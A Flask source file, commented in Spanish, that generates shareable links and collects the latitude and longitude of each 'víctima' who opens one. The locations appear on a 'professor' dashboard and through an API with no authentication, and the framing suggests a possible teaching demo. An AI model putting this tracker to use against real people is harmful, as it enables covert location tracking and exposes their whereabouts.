from flask import Flask, render_template, request, jsonify, redirect, url_for
import random
import string
import logging

app = Flask(__name__)
app.logger.setLevel(logging.ERROR)

# Registro de usuarios conectados
usuarios = {}

def generar_codigo():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

@app.route('/')
def home():
    return """
    <h2>Bienvenido al sistema de geolocalización</h2>
    <p><a href="/registrar">🔗 Generar nuevo enlace de ubicación</a></p>
    <p><a href="/dashboard">🗺️ Ver ubicaciones en mapa</a></p>
    """

# Interfaz para la "víctima"
@app.route('/registrar')
def registrar_usuario():
    codigo = generar_codigo()
    usuarios[codigo] = {"lat": None, "lon": None}
    return redirect(url_for('mostrar_pagina', codigo=codigo))

@app.route('/<string:codigo>')
def mostrar_pagina(codigo):
    if codigo not in usuarios:
        return "Código inválido", 404
    return render_template('index.html', codigo=codigo)

@app.route('/actualizar', methods=['POST'])
def actualizar_ubicacion():
    codigo = request.form.get('codigo')
    lat = request.form.get('latitud')
    lon = request.form.get('longitud')

    if codigo in usuarios and lat and lon:
        usuarios[codigo]['lat'] = float(lat)
        usuarios[codigo]['lon'] = float(lon)
        return jsonify({'status': 'ok'})
    else:
        return jsonify({'status': 'error'}), 400

# Dashboard del profesor
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/ubicaciones')
def api_ubicaciones():
    return jsonify(usuarios)

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)